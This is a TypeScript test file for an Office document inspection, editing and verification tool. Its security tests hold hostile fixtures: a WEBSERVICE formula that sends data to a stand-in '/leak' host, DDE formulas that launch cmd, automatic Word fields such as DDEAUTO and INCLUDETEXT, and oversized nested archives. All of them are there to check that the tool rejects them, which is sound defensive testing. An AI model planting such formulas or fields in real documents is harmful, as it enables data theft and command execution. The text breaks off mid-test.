import { execFile, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import ExcelJS from "exceljs";
import { strFromU8, strToU8, unzipSync, zipSync } from "fflate";
import { describe, expect, it } from "vitest";
import { z } from "zod";
import { authorOfficeDocument } from "./document-author";
import { documentAuthoringSchema } from "./document-authoring-schema";
import {
  deriveOfficeVerification,
  executeOfficeDocument,
  formatOfficeComDiagnostic,
  inspectOfficeComPackageBoundary,
  inspectSpreadsheetFormulaCoverage,
  interpretOfficeComProcessResult,
  officeComStageLabel,
  officeDocumentAssets,
  officeDocumentSourcePath,
  officeProcessOwnerMatches,
  parseA1Range,
  parseOfficeComStage,
  parseOfficeProcessOwner,
  verifyWithMicrosoftOffice,
} from "./office-document";
import {
  assertOfficeInputExtensions,
  officeDocumentSchema,
  officeFormulaIsUnsafe,
} from "./office-document-schema";
import { embedWorkbookInDocx, embedWorkbookInXlsx } from "./office-package-test-fixtures";

const execFileAsync = promisify(execFile);

function hash(bytes: Buffer): string {
  return createHash("sha256").update(bytes).digest("hex");
}

async function workbookBytes(extra: Record<string, Uint8Array> = {}): Promise<Buffer> {
  const workbook = new ExcelJS.Workbook();
  const sheet = workbook.addWorksheet("Data");
  sheet.addRow(["Revenue", "Cost"]);
  sheet.addRow([1250, 800]);
  sheet.getCell("C2").value = { formula: "A2-B2", result: 450 };
  const archive = unzipSync(Buffer.from(await workbook.xlsx.writeBuffer()));
  return Buffer.from(zipSync({ ...archive, ...extra }));
}

function declareFirstZipEntrySize(bytes: Uint8Array, declared: number): Buffer {
  const output = Buffer.from(bytes);
  for (const [signature, sizeOffset] of [
    [0x04034b50, 22],
    [0x02014b50, 24],
  ] as const) {
    const marker = Buffer.alloc(4);
    marker.writeUInt32LE(signature);
    const offset = output.indexOf(marker);
    expect(offset).toBeGreaterThanOrEqual(0);
    output.writeUInt32LE(declared, offset + sizeOffset);
  }
  return output;
}

function docxFixture(body: string, relationships = ""): Buffer {
  const relationshipNamespace = "http://schemas.openxmlformats.org/package/2006/relationships";
  return Buffer.from(
    zipSync({
      "[Content_Types].xml": strToU8(
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
      ),
      "_rels/.rels": strToU8(
        `<Relationships xmlns="${relationshipNamespace}"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`,
      ),
      "word/document.xml": strToU8(
        `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body>${body}<w:sectPr/></w:body></w:document>`,
      ),
      "word/_rels/document.xml.rels": strToU8(
        `<Relationships xmlns="${relationshipNamespace}">${relationships}</Relationships>`,
      ),
    }),
  );
}

describe("office_document", () => {
  it("reports the last controlled COM stage without exposing the isolated input path", () => {
    const temporaryRoot = "C:\\Temp\\mingshen-office-verify-fixture";
    const inputPath = `${temporaryRoot}\\input.docx`;
    const diagnostic = formatOfficeComDiagnostic(
      `Office failed while opening ${inputPath}.`,
      parseOfficeComStage(
        '{"event":"office-stage","stage":"open-document"}\n{"event":"office-stage","stage":"verify-output"}',
      ),
      [temporaryRoot, inputPath],
    );
    expect(parseOfficeComStage('{"event":"office-stage","stage":"open-document"}')).toBe(
      "open-document",
    );
    expect(parseOfficeComStage('{"status":"verified","stage":"completed"}')).toBe("completed");
    expect(officeComStageLabel("open-document")).toBe("打开文档");
    expect(diagnostic).toContain("<隔离路径>");
    expect(diagnostic).toContain("最后阶段：检查输出");
    expect(diagnostic).not.toContain(temporaryRoot);
    expect(diagnostic).not.toContain("input.docx");
  });

  it("proves the new Office instance is empty before recording cleanup ownership", async () => {
    const script = await readFile(
      join(process.cwd(), "resources", "documents", "office-com-verify.ps1"),
      "utf8",
    );
    const indices = (needle: string) =>
      [...script.matchAll(new RegExp(needle.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g"))].map(
        (match) => match.index,
      );
    const resolveOwner = indices(
      "$owner = Resolve-OfficeProcessOwner $application $attemptStartedAt",
    );
    const verifyEmpty = indices("$instanceCount = Get-OfficeInstanceDocumentCount $application");
    const recordOwner = indices("Register-OfficeProcessOwner $owner");
    expect(resolveOwner).toHaveLength(3);
    expect(verifyEmpty).toHaveLength(3);
    expect(recordOwner).toHaveLength(3);
    for (let index = 0; index < 3; index++) {
      expect(verifyEmpty[index] ?? -1).toBeGreaterThan(resolveOwner[index] ?? -1);
      expect(recordOwner[index] ?? -1).toBeGreaterThan(verifyEmpty[index] ?? -1);
    }
    expect(script).toContain("if ($instanceCount -ne 0)");
    expect(script).toContain("$abandonApplication = $true");
    expect(script).not.toContain("Register-OfficeProcessOwner $application");
    expect(script).toContain(
      "$document = $application.Documents.OpenNoRepairDialog($InputPath, $false, $true, $false, [Type]::Missing, [Type]::Missing, $false, [Type]::Missing, [Type]::Missing, [Type]::Missing, [Type]::Missing, $false, $false, [Type]::Missing, $true, [Type]::Missing)",
    );
    expect(script).toContain('$reportStage = "completed"');
  });

  it("allows ordinary external hyperlinks and internal Word fields at the COM boundary", () => {
    const source = docxFixture(
      '<w:p><w:hyperlink r:id="rIdHyperlink"><w:r><w:t>Reference site</w:t></w:r></w:hyperlink></w:p>' +
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> REF INTERNAL_MARK </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>Internal</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
      '<Relationship Id="rIdHyperlink" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/>',
    );
    expect(inspectOfficeComPackageBoundary(source, ".docx")).toEqual({
      safe: true,
      reasons: [],
    });
  });

  it("keeps safe DOCX hyperlinks and charts available to structural verification", async () => {
    const archive = unzipSync(
      docxFixture(
        '<w:p><w:hyperlink r:id="rIdHyperlink"><w:r><w:t>Reference site</w:t></w:r></w:hyperlink></w:p>',
        '<Relationship Id="rIdHyperlink" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/>' +
          '<Relationship Id="rIdChart" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="charts/chart1.xml"/>',
      ),
    );
    const source = Buffer.from(
      zipSync({
        ...archive,
        "word/charts/chart1.xml": strToU8(
          '<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"/>',
        ),
      }),
    );
    const result = await executeOfficeDocument(
      { operation: "verify", path: "safe-links-and-chart.docx", render: false },
      new Map([["safe-links-and-chart.docx", source]]),
    );
    expect(result.output).toContain("DOCX 结构通过");
    expect(result.verification?.status).toBe("verified");
  });

  it("rejects dangerous formulas in embedded XLSX before DOCX Office verification", async () => {
    const embeddedWorkbook = new ExcelJS.Workbook();
    embeddedWorkbook.addWorksheet("Data").getCell("A1").value = {
      formula: 'WEBSERVICE("https://example.com/leak")',
      result: "",
    };
    const embedded = Buffer.from(await embeddedWorkbook.xlsx.writeBuffer());
    const source = embedWorkbookInDocx(
      docxFixture("<w:p><w:r><w:t>Embedded workbook</w:t></w:r></w:p>"),
      embedded,
    );

    await expect(
      executeOfficeDocument(
        { operation: "verify", path: "embedded-formula.docx", render: true },
        new Map([["embedded-formula.docx", source]]),
        undefined,
        { canUseOffice: true },
      ),
    ).rejects.toThrow("OFFICE_UNSAFE_FORMULA");
  });

  it("rejects non-hyperlink relationships and split automatic fields before Word COM", async () => {
    const externalImage = docxFixture(
      "<w:p><w:r><w:t>External image fixture</w:t></w:r></w:p>",
      '<Relationship Id="rIdImage" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://example.com/image.png" TargetMode="External"/>',
    );
    expect(inspectOfficeComPackageBoundary(externalImage, ".docx").reasons).toContain(
      "OOXML_EXTERNAL_NON_HYPERLINK_RELATIONSHIP",
    );

    const splitInclude = docxFixture(
      '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDE</w:instrText></w:r><w:r><w:instrText xml:space="preserve">TEXT "external.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>Included</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
    );
    for (const [left, right, field] of [
      ["INCLUDE", "TEXT", "INCLUDETEXT"],
      ["INCLUDE", "PICTURE", "INCLUDEPICTURE"],
      ["DDE", "AUTO", "DDEAUTO"],
      ["DATA", "BASE", "DATABASE"],
      ["LI", "NK", "LINK"],
      ["EM", "BED", "EMBED"],
      ["MACRO", "BUTTON", "MACROBUTTON"],
    ]) {
      const source = docxFixture(
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>' +
          `<w:r><w:instrText xml:space="preserve"> ${left}</w:instrText></w:r>` +
          `<w:r><w:instrText xml:space="preserve">${right} &quot;fixture&quot;</w:instrText></w:r>` +
          '<w:r><w:fldChar w:fldCharType="separate"/></w:r>' +
          "<w:r><w:t>Field</w:t></w:r>" +
          '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
      );
      expect(inspectOfficeComPackageBoundary(source, ".docx").reasons).toContain(
        `DOCX_AUTOMATIC_FIELD_${field}`,
      );
    }
    for (const field of ["INCLUDEPICTURE", "LINK", "DDE", "DDEAUTO", "DATABASE"]) {
      const source = docxFixture(
        `<w:p><w:fldSimple w:instr=" ${field} &quot;fixture&quot; "><w:r><w:t>Field</w:t></w:r></w:fldSimple></w:p>`,
      );
      expect(inspectOfficeComPackageBoundary(source, ".docx").reasons).toContain(
        `DOCX_AUTOMATIC_FIELD_${field}`,
      );
    }

    await expect(
      executeOfficeDocument(
        { operation: "verify", path: "automatic-field.docx", render: true },
        new Map([["automatic-field.docx", splitInclude]]),
        undefined,
        { canUseOffice: true },
      ),
    ).rejects.toThrow("DOCX_ACTIVE_FIELD_UNSUPPORTED");
  });

  it("rejects XLSX data-connection parts only at the Office COM boundary", async () => {
    for (const path of [
      "xl/connections.xml",
      "xl/queryTables/queryTable1.xml",
      "xl/model/model.xml",
    ]) {
      const source = await workbookBytes({ [path]: strToU8("<connectionFixture/>") });
      expect(inspectOfficeComPackageBoundary(source, ".xlsx").reasons).toContain(
        "XLSX_COM_DATA_CONNECTION_PART",
      );
      const inspection = await executeOfficeDocument(
        { operation: "inspect", path: "connection.xlsx" },
        new Map([["connection.xlsx", source]]),
      );
      expect(inspection.output).toContain("XLSX 结构");
      const result = await executeOfficeDocument(
        { operation: "verify", path: "connection.xlsx", render: true },
        new Map([["connection.xlsx", source]]),
        undefined,
        { canUseOffice: true },
      );
      expect(result.output).toContain("Microsoft Office 验证：unavailable");
      expect(result.output).toContain("Excel 外部数据连接部件");
      expect(result.rendition).toBeUndefined();
    }
  });

  it("parses strict A1 ranges and rejects invalid order", () => {
    expect(parseA1Range("$B$2:D9")).toEqual({
      startRow: 2,
      startColumn: 2,
      endRow: 9,
      endColumn: 4,
    });
    expect(() => parseA1Range("D9:B2")).toThrow("A1_RANGE_ORDER");
    expect(() => parseA1Range("XFE1")).toThrow("A1_RANGE_LIMIT");
  });

  it("keeps the office schema convertible for the model tool definition", () => {
    const json = z.toJSONSchema(officeDocumentSchema, { target: "draft-7" });
    expect(JSON.stringify(json)).toContain('"operation"');
  });

  it("rejects active formulas and external workbook references before authoring", () => {
    for (const formula of [
      'WEBSERVICE("https://example.com/leak")',
      'RTD("prog.id",,1)',
      'DDE("cmd","/c calc","")',
      "'[outside.xlsx]Sheet1'!A1",
      "'//server/share/book.xlsx'!A1",
    ]) {
      expect(() =>
        officeDocumentSchema.parse({
          operation: "create_spreadsheet",
          path: "unsafe.xlsx",
          workbook: {
            sheets: [
              {
                name: "Data",
                cells: [{ row: 1, column: 1, value: { formula } }],
              },
            ],
          },
        }),
      ).toThrow("公式含主动外部调用或危险函数");
    }
  });

  it("allows structured table references while rejecting active and external workbook formulas", () => {
    for (const formula of [
      "SUM(Sales[Revenue])",
      "[@Amount]",
      "SUM(Table1[[#This Row],[Revenue]])",
      "Sales[Revenue] * 1.2",
      "IF([@Amount] > 0, SUM(Sales[Revenue]), 0)",
    ])
      expect(officeFormulaIsUnsafe(formula), formula).toBe(false);

    for (const formula of [
      "[book.xlsx]Sheet1!A1",
      "'[book.xlsx]Sheet 1'!$A$1",
      "[1]Sheet1!A1",
      "'C:\\Reports\\[book.xlsx]Sheet1'!A1",
      "'\\\\server\\share\\[book.xlsx]Sheet1'!A1",
      'EXTERNAL("book","Sheet1!A1")',
      'WEBSERVICE("https://example.com/leak")',
      'RTD("prog.id",,1)',
      'DDE("cmd","/c calc","")',
      "cmd|'/c calc'!A0",
      'IMAGE("https://example.com/image.png")',
      'STOCKHISTORY("AAPL","2026-01-01","2026-02-01")',
      'CUBEMEMBER("ThisWorkbookDataModel","[Measures].[Revenue]")',
      'CUBEVALUE("ThisWorkbookDataModel","[Measures].[Revenue]")',
    ])
      expect(officeFormulaIsUnsafe(formula), formula).toBe(true);
  });

  it("enforces one cumulative work budget across spreadsheet operations", () => {
    expect(() =>
      officeDocumentSchema.parse({
        operation: "edit_spreadsheet",
        path: "output.xlsx",
        source: { path: "source.xlsx", expected_sha256: "0".repeat(64) },
        operations: Array.from({ length: 51 }, () => ({
          type: "style_range",
          sheet: "Data",
          range: "A1:Z1000",
          style: { font: { bold: true } },
        })),
      }),
    ).toThrow("电子表格请求累计工作量不能超过");

    expect(() =>
      officeDocumentSchema.parse({
        operation: "create_spreadsheet",
        path: "large.xlsx",
        workbook: {
          sheets: Array.from({ length: 3 }, (_, sheetIndex) => ({
            name: `Sheet${sheetIndex + 1}`,
            cells: Array.from({ length: 34_000 }, (_, index) => ({
              row: Math.floor(index / 100) + 1,
              column: (index % 100) + 1,
              value: index,
            })),
          })),
        },
      }),
    ).toThrow("电子表格请求累计工作量不能超过");
  });

  it("rejects active formulas in existing workbooks at inspect and COM boundaries", async () => {
    const workbook = new ExcelJS.Workbook();
    workbook.addWorksheet("Data").getCell("A1").value = {
      formula: 'WEBSERVICE("https://example.com/leak")',
      result: "",
    };
    const source = Buffer.from(await workbook.xlsx.writeBuffer());
    expect(inspectOfficeComPackageBoundary(source, ".xlsx").reasons).toContain(
      "XLSX_ACTIVE_FORMULA",
    );
    await expect(
      executeOfficeDocument(
        { operation: "inspect", path: "unsafe.xlsx" },
        new Map([["unsafe.xlsx", source]]),
      ),
    ).rejects.toThrow("OFFICE_UNSAFE_FORMULA");
  });

  it("creates a styled workbook with formulas, merged cells, filters and a native table", async () => {
    const result = await executeOfficeDocument({
      operation: "create_spreadsheet",
      path: "report.xlsx",
      workbook: {
        sheets: [
          {
            name: "Summary",
            freeze: { row: 1, column: 1 },
            columns: [
              { index: 1, width: 24 },
              { index: 2, width: 16 },
            ],
            cells: [
              {
                row: 1,
                column: 1,
                value: "Metric",
                style: {
                  font: { bold: true, color: "FFFFFFFF" },
                  fill: "1F6F78",
                },
              },
              {
                row: 1,
                column: 2,
                value: "Value",
                style: { font: { bold: true }, fill: "DDEBF7" },
              },
              { row: 2, column: 1, value: "Revenue" },
              { row: 2, column: 2, value: 1200 },
              { row: 3, column: 1, value: "Cost" },
              { row: 3, column: 2, value: 700 },
              {
                row: 4,
                column: 1,
                value: "Margin",
                style: { font: { bold: true } },
              },
              {
                row: 4,
                column: 2,
                value: { formula: "B2-B3", result: 500 },
                style: { number_format: "#,##0" },
              },
            ],
            tables: [
              {
                name: "SummaryTable",
                range: "A1:B3",
                style: "TableStyleMedium2",
              },
            ],
            filter: "A1:B3",
          },
        ],
      },
    });
    expect(result.bytes).toBeDefined();
    const archive = unzipSync(result.bytes ?? new Uint8Array());
    const styles = strFromU8(archive["xl/styles.xml"] ?? new Uint8Array());
    const sheet = strFromU8(archive["xl/worksheets/sheet1.xml"] ?? new Uint8Array());
    expect(styles).toContain("FF1F6F78");
    expect(sheet).toContain("B4");
    expect(sheet).toContain("<f>B2-B3</f>");
    expect(sheet).toContain("autoFilter");
    expect(Object.keys(archive).some((name) => /^xl\/tables\/table\d+\.xml$/.test(name))).toBe(
      true,
    );
    expect(result.warnings.join("\n")).toContain("尚未由真实 Excel");

    const inspection = await executeOfficeDocument(
      { operation: "inspect", path: "report.xlsx" },
      new Map([["report.xlsx", result.bytes ?? Buffer.alloc(0)]]),
    );
    expect(inspection.output).toContain("公式：1");
    expect(inspection.output).toContain("B2-B3");
  });

  it("applies a deterministic report surface and print layout to a workbook", async () => {
    const result = await executeOfficeDocument({
      operation: "create_spreadsheet",
      path: "board-report.xlsx",
      workbook: {
        design: { preset: "consulting", accent: "1F4E78" },
        sheets: [
          {
            name: "Board report",
            columns: [
              { index: 1, width: 26 },
              { index: 2, width: 16 },
              { index: 3, width: 18 },
            ],
            cells: [
              { row: 1, column: 1, value: "Quarterly operating report" },
              { row: 2, column: 1, value: "Metric" },
              { row: 2, column: 2, value: "Actual" },
              { row: 2, column: 3, value: "Plan" },
              { row: 3, column: 1, value: "Revenue" },
              { row: 3, column: 2, value: 1240 },
              { row: 3, column: 3, value: 1200, style: { number_format: "#,##0" } },
            ],
            presentation: {
              title_range: "A1:C1",
              header_range: "A2:C2",
              body_range: "A3:C3",
              show_grid_lines: false,
              print_area: "A1:C3",
              print_titles_rows: "2:2",
              orientation: "landscape",
              fit_to_page: true,
            },
          },
        ],
      },
    });
    expect(result.bytes).toBeDefined();
    const archive = unzipSync(result.bytes ?? new Uint8Array());
    const worksheet = strFromU8(archive["xl/worksheets/sheet1.xml"] ?? new Uint8Array());
    const workbookXml = strFromU8(archive["xl/workbook.xml"] ?? new Uint8Array());
    const styles = strFromU8(archive["xl/styles.xml"] ?? new Uint8Array());
    expect(worksheet).toContain('showGridLines="0"');
    expect(workbookXml).toContain("_xlnm.Print_Area");
    expect(workbookXml).toContain("_xlnm.Print_Titles");
    expect(worksheet).toContain('orientation="landscape"');
    expect(styles).toContain("FF1F4E78");
    expect(styles).toContain("FFFFFFFF");
  });

  it("edits an existing workbook by source SHA and preserves unrelated package bytes", async () => {
    const marker = strToU8("<custom>keep-byte-identical</custom>");
    const source = await workbookBytes({ "customXml/item1.xml": marker });
    const result = await executeOfficeDocument(
      {
        operation: "edit_spreadsheet",
        path: "updated.xlsx",
        source: { path: "source.xlsx", expected_sha256: hash(source) },
        operations: [
          {
            type: "set_range",
            sheet: "Data",
            range: "A4:C5",
            rows: [
              ["Margin", 450, "approved"],
              ["Tax", 150, "pending"],
            ],
            style: { alignment: { wrap_text: true } },
          },
          {
            type: "style_range",
            sheet: "Data",
            range: "A1:C1",
            style: {
              font: { bold: true, color: "FFFFFFFF" },
              fill: "17365D",
            },
          },
          { type: "freeze", sheet: "Data", row: 1, column: 0 },
          { type: "filter", sheet: "Data", range: "A1:C5" },
          {
            type: "add_table",
            sheet: "Data",
            name: "UpdatedTable",
            range: "A1:C5",
            style: "TableStyleMedium9",
          },
          {
            type: "format_sheet",
            sheet: "Data",
            presentation: {
              preset: "executive",
              title_range: "A1:C1",
              header_range: "A1:C1",
              body_range: "A2:C5",
              show_grid_lines: false,
              orientation: "landscape",
              fit_to_page: true,
            },
          },
        ],
      },
      new Map([["source.xlsx", source]]),
    );
    expect(result.bytes).toBeDefined();
    const archive = unzipSync(result.bytes ?? new Uint8Array());
    expect(archive["customXml/item1.xml"]).toEqual(marker);
    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(result.bytes as unknown as Parameters<typeof workbook.xlsx.load>[0]);
    expect(workbook.getWorksheet("Data")?.getCell("A4").value).toBe("Margin");
    expect(workbook.getWorksheet("Data")?.getCell("C5").value).toBe("pending");
    expect(workbook.getWorksheet("Data")?.getCell("C2").formula).toBe("A2-B2");
    expect(workbook.getWorksheet("Data")?.views?.[0]?.showGridLines).toBe(false);
    expect(workbook.getWorksheet("Data")?.pageSetup.orientation).toBe("landscape");
    expect(workbook.getWorksheet("Data")?.pageSetup.fitToPage).toBe(true);
  });

  it("rejects stale XLSX SHA before returning replacement bytes", async () => {
    const source = await workbookBytes();
    await expect(
      executeOfficeDocument(
        {
          operation: "edit_spreadsheet",
          path: "updated.xlsx",
          source: { path: "source.xlsx", expected_sha256: "0".repeat(64) },
          operations: [
            {
              type: "set_cells",
              sheet: "Data",
              cells: [{ row: 2, column: 2, value: 900 }],
            },
          ],
        },
        new Map([["source.xlsx", source]]),
      ),
    ).rejects.toThrow("DOCUMENT_SOURCE_CHANGED");
  });

  it("rejects macro or external-link package parts before editing", async () => {
    const source = await workbookBytes({
      "xl/vbaProject.bin": strToU8("not-a-real-macro"),
    });
    await expect(
      executeOfficeDocument(
        {
          operation: "edit_spreadsheet",
          path: "updated.xlsx",
          source: { path: "source.xlsx", expected_sha256: hash(source) },
          operations: [
            {
              type: "set_cells",
              sheet: "Data",
              cells: [{ row: 2, column: 2, value: 900 }],
            },
          ],
        },
        new Map([["source.xlsx", source]]),
      ),
    ).rejects.toThrow("OFFICE_UNSUPPORTED_PART");
  });

  it("budgets nested XLSX decompression before expanding embeds", async () => {
    const embedded = Buffer.from(
      zipSync({
        "xl/workbook.xml": strToU8("<workbook/>"),
        "payload.bin": new Uint8Array([1, 2, 3]),
      }),
    );
    const oversized = declareFirstZipEntrySize(embedded, 32 * 1024 * 1024 + 1);
    const outer = embedWorkbookInXlsx(await workbookBytes(), oversized);
    await expect(
      executeOfficeDocument(
        { operation: "inspect", path: "nested.xlsx" },
        new Map([["nested.xlsx", outer]]),
      ),
    ).rejects.toThrow("嵌入工作簿");
  });

  it("enforces cumulative embedded archive size, entries and recursion depth", async () => {
    const sizeableEmbedded = await workbookBytes({
      "xl/payload.bin": new Uint8Array(26 * 1024 * 1024),
    });
    let cumulative = await workbookBytes();
    for (let index = 1; index <= 4; index += 1)
      cumulative = embedWorkbookInXlsx(cumulative, sizeableEmbedded, {
        partName: `xl/embeddings/item${index}.xlsx`,
      });
    await expect(
      executeOfficeDocument(
        { operation: "inspect", path: "cumulative.xlsx" },
        new Map([["cumulative.xlsx", cumulative]]),
      ),
    ).rejects.toThrow("累计声明解压大小");

    const manyEntries = await workbookBytes(
      Object.fromEntries(
        Array.from({ length: 2_001 }, (_, index) => [
          `xl/payload-${index}.bin`,
          new Uint8Array([1]),
        ]),
      ),
    );
    const entryHeavy = embedWorkbookInXlsx(
      embedWorkbookInXlsx(await workbookBytes(), manyEntries, {
        partName: "xl/embeddings/one.xlsx",
      }),
      manyEntries,
      { partName: "xl/embeddings/two.xlsx" },
    );
    await expect(
      executeOfficeDocument(
        { operation: "inspect", path: "entry-heavy.xlsx" },
        new Map([["entry-heavy.xlsx", entryHeavy]]),
      ),
    ).rejects.toThrow("累计 ZIP 条目");

    let nested = await workbookBytes();
    for (let depth = 1; depth <= 5; depth += 1)
      nested = embedWorkbookInXlsx(nested, nested, {
        partName: `xl/embeddings/depth-${depth}.xlsx`,
      });
    await expect(
      executeOfficeDocument(
        { operation: "inspect", path: "deep.xlsx" },
        new Map([["deep.xlsx", nested]]),
      ),
    ).rejects.toThrow("递归深度");
  });

  it("rejects dangerous formulas inside embedded XLSX packages", async () => {
    const embeddedWorkbook = new ExcelJS.Workbook();
    embeddedWorkbook.addWorksheet("Data").getCell("A1").value = {
      formula: 'WEBSERVICE("https://example.com/leak")',
      result: "",
    };
    const embedded = Buffer.from(await embeddedWorkbook.xlsx.writeBuffer());
    const outer = embedWorkbookInXlsx(await workbookBytes(), embedded);
    await expect(
      executeOfficeDocument(
        { operation: "inspect", path: "nested-formula.xlsx" },
        new Map([["nested-formula.xlsx", outer]]),
      ),
    ).rejects.toThrow("OFFICE_UNSAFE_FORMULA");
  });

  it("edits PPTX shape, table and notes anchors while preserving unrelated parts", async () => {
    const source = await authorOfficeDocument(
      documentAuthoringSchema.parse({
        path: "deck.pptx",
        title: "Quarterly review",
        slides: [
          {
            title: "Quarterly review",
            notes: "Original speaker notes",
            blocks: [
              { type: "paragraph", text: "Original body text" },
              {
                type: "table",
                header: true,
                rows: [
                  ["Metric", "Value"],
                  ["Revenue", "100"],
                ],
              },
            ],
          },
        ],
      }),
      new Map(),
    );
    const marker = strToU8("<custom>ppt-extra-byte-identical</custom>");
    const archive = unzipSync(source);
    const withMarker = Buffer.from(zipSync({ ...archive, "ppt/customXml/item1.xml": marker }));
    const inspection = await executeOfficeDocument(
      { operation: "inspect", path: "deck.pptx" },
      new Map([["deck.pptx", withMarker]]),
    );
    const records = inspection.output.split("\n").flatMap((line) => {
      try {
        return [JSON.parse(line) as Record<string, unknown>];
      } catch {
        return [];
      }
    });
    const body = records.find(
      (record) => record.kind === "shape" && record.text === "Original body text",
    );
    expect(body?.shape_id).toEqual(expect.any(Number));
    const result = await executeOfficeDocument(
      {
        operation: "edit_presentation",
        path: "revised.pptx",
        source: { path: "deck.pptx", expected_sha256: hash(withMarker) },
        operations: [
          {
            type: "replace_shape_text",
            slide: 1,
            shape_id: Number(body?.shape_id),
            old_text: "Original body text",
            new_text: "Revised body text",
          },
          {
            type: "set_table_cell",
            slide: 1,
            table: 1,
            row: 2,
            column: 2,
            text: "125",
          },
          {
            type: "replace_notes_text",
            slide: 1,
            old_text: "Original speaker notes",
            new_text: "Revised speaker notes",
          },
        ],
      },
      new Map([["deck.pptx", withMarker]]),
    );
    expect(result.bytes).toBeDefined();
    const output = unzipSync(result.bytes ?? new Uint8Array());
    expect(output["ppt/customXml/item1.xml"]).toEqual(marker);
    const revisedInspection = await executeOfficeDocument(
      { operation: "inspect", path: "revised.pptx" },
      new Map([["revised.pptx", result.bytes ?? Buffer.alloc(0)]]),
    );
    expect(revisedInspection.output).toContain("Revised body text");
    expect(revisedInspection.output).toContain('"125"');
    expect(revisedInspection.output).toContain("Revised speaker notes");
  });

  it("marks PPTX inspection and structural verification partial beyond 2000 objects", async () => {
    const source = await authorOfficeDocument(
      documentAuthoringSchema.parse({
        path: "large-deck.pptx",
        title: "Large deck",
        slides: [
          {
            title: "Large deck",
            notes: "Bounded structure fixture",
            blocks: [{ type: "paragraph", text: "Repeated object fixture" }],
          },
        ],
      }),
      new Map(),
    );
    const archive = unzipSync(source);
    const slideName = Object.keys(archive).find((name) =>
      /^ppt\/slides\/slide\d+\.xml$/i.test(name),
    );
    expect(slideName).toBeDefined();
    const slideBytes = archive[slideName ?? ""];
    expect(slideBytes).toBeDefined();
    const slideXml = strFromU8(slideBytes ?? new Uint8Array());
    const shape = slideXml.match(/<p:sp\b[\s\S]*?<\/p:sp>/)?.[0];
    expect(shape).toBeTruthy();
    archive[slideName ?? ""] = strToU8(
      slideXml.replace("</p:spTree>", `${(shape ?? "").repeat(2_001)}</p:spTree>`),
    );
    const bytes = Buffer.from(zipSync(archive));

    const inspection = await executeOfficeDocument(
      { operation: "inspect", path: "large-deck.pptx" },
      new Map([["large-deck.pptx", bytes]]),
    );
    expect(inspection.warnings.join("\n")).toContain("2000 个形状/表格上限");

    const verification = await executeOfficeDocument(
      {
        operation: "verify",
        path: "large-deck.pptx",
        render: false,
        recalculate: false,
      },
      new Map([["large-deck.pptx", bytes]]),
    );
    expect(verification.verification).toMatchObject({ status: "partial" });
    expect(verification.structureCheck).toEqual({
      structure: "partial",
      content: "partial",
    });
    expect(verification.output).toContain("PPTX 结构有界检查为 partial");
  });

  it("performs structural verification and explicitly omits host Office without capability", async () => {
    const source = await workbookBytes();
    const result = await executeOfficeDocument(
      {
        operation: "verify",
        path: "report.xlsx",
        render: true,
        recalculate: true,
      },
      new Map([["report.xlsx", source]]),
      undefined,
      { canUseOffice: false },
    );
    expect(result.output).toContain("XLSX 结构通过");
    expect(result.warnings.join("\n")).toContain("不允许启用宿主 Microsoft Office");
    expect(result.rendition).toBeUndefined();
    expect(result.recalculatedBytes).toBeUndefined();
    expect(result.verification).toEqual({
      status: "unavailable",
      render: "unavailable",
      recalculation: "unavailable",
    });
  });

  it("reports structural-only and sampled formula verification as partial", async () => {
    const workbook = new ExcelJS.Workbook();
    const sheet = workbook.addWorksheet("Large");
    for (let row = 1; row <= 2_001; row++) sheet.getCell(row, 1).value = row;
    const source = Buffer.from(await workbook.xlsx.writeBuffer());

    const structuralOnly = await executeOfficeDocument(
      {
        operation: "verify",
        path: "large.xlsx",
        render: false,
        recalculate: false,
      },
      new Map([["large.xlsx", source]]),
    );
    expect(structuralOnly.verification).toEqual({
      status: "partial",
      render: "not_requested",
      recalculation: "not_requested",
    });
    expect(structuralOnly.structureCheck).toEqual({
      structure: "partial",
      content: "partial",
    });
    expect(structuralOnly.output).toContain("公式扫描为 partial");
  });

  it("counts formulas beyond the display sample under the bounded delivery scanner", async () => {
    const workbook = new ExcelJS.Workbook();
    const sheet = workbook.addWorksheet("Formulas");
    sheet.getCell("A1").value = {
      formula: "1/0",
      result: { error: "#DIV/0!" },
    } as unknown as ExcelJS.CellValue;
    sheet.getCell("A2").value = {
      formula: "SEQUENCE(2)",
      result: { error: "#SPILL!" },
    } as unknown as ExcelJS.CellValue;
    for (let row = 3; row <= 2_100; row++)
      sheet.getCell(row, 1).value = { formula: `${row}+1`, result: row + 1 };
    const source = Buffer.from(await workbook.xlsx.writeBuffer());
    const coverage = await inspectSpreadsheetFormulaCoverage(source);
    expect(coverage).toMatchObject({
      formulas: 2_100,
      uncachedFormulas: 0,
      errors: 2,
      inspectedCells: 2_100,
      complete: true,
      sampleLimit: 50,
    });
    expect(coverage.samples).toHaveLength(50);
